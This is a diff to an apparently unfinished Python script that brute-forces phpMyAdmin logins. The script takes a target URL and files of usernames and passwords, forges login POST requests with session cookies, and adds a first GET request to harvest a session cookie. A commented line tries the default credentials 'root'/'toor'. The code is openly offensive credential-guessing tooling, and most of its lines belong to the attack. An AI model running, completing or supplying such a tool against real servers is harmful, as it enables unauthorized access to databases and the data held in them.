@@ -52,18 +52,17 @@ import sys
 URL = sys.argv[1]
 USER_FILE = sys.argv[2]
 PASS_FILE = sys.argv[3]
-INIT_TOKEN = sys.argv[4]
-INIT_COOKIE = sys.argv[5]
+#INIT_TOKEN = sys.argv[4]
+#INIT_COOKIE = sys.argv[5]
 
-def forge_request(url, token, resp_cookie, username, password):
+def forge_post(url, token, resp_cookie, username, password):
 
-    if resp_cookie:
-        current_cookie = resp_cookie
-    else:
-        current_cookie = INIT_COOKIE
+    cookie = {
+        "phpMyAdmin":resp_cookie,
+    }
 
     payload ={
-        "set_session" : current_cookie,
+        "set_session" : resp_cookie,
         "pma_username" :  username,
         "pma_password" : password,
         "server" : 1,
@@ -74,31 +73,47 @@ def forge_request(url, token, resp_cookie, username, password):
     }
 
 
-    cookie = {
-        "phpMyAdmin":current_cookie,
-    }
-
     resp = requests.post(url, data=payload, cookies=cookie)
 
     return resp
 
 def analyze_resp(resp):
     
+    #extract response cookie 
 
+    for cookie in resp.cookies:
+        print(cookie)
+
+    #print(resp.text)
+
+    #resp_cookie = re.search(r"phpMyAdmin=\K\w+(?=;)", resp.cookies)
+
+    #resp_cookie = 1
+
+    #return (resp_cookie, match)
 
     return 0
 
+def do_get (URL):
 
+    resp = requests.get(URL)
+
+    return resp
+
+###########################################MAIN#############################################
 
 def main():
 
-    print(f"Bruting for {URL}\n"
-    f"users in {USER_FILE}\n"
-    f"passwords in {PASS_FILE}\n"
-    f"initial Token: {INIT_TOKEN}\n"
-    f"initial Cookie: {INIT_COOKIE}")
+    #initialize bruteforce session by sending virgin GET request
+    resp = do_get(URL)
 
-    resp_cookie = False
+    #resp = forge_post(URL, token, cookie, "root", "toor")
+
+    analyze_resp(resp)
+    
+    #(cookie,token) = analyze_resp(resp)
+
+
 
     return 0
 
